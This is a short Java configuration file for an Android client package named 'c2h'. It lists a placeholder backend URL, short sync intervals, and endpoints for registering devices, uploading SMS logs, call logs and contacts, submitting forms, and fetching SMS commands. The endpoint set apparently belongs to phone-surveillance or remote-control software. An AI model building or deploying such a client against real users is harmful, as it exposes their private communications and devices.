package com.c2h.client;

public class Config {
    
    // ⚠️ IMPORTANT: Update this with your backend URL
    // For production: https://your-backend-url.com
    public static final String API_BASE_URL = "https://your-backend-url.com/api/";
    
    // SharedPreferences
    public static final String PREFS_NAME = "C2HClientPrefs";
    public static final String KEY_DEVICE_ID = "device_id";
    public static final String KEY_REGISTERED = "is_registered";
    
    // Sync intervals (milliseconds)
    public static final long SYNC_INTERVAL = 30000; // 30 seconds
    public static final long STATUS_UPDATE_INTERVAL = 60000; // 1 minute
    
    // API endpoints
    public static final String ENDPOINT_REGISTER = "device/register";
    public static final String ENDPOINT_UPDATE = "device/update";
    public static final String ENDPOINT_SMS_LOG = "sms/log";
    public static final String ENDPOINT_SMS_COMMANDS = "sms/commands/";
    public static final String ENDPOINT_CALL_LOG = "calls/log";
    public static final String ENDPOINT_CONTACTS_SYNC = "contacts/sync";
    public static final String ENDPOINT_FORMS_SUBMIT = "forms/submit";
}
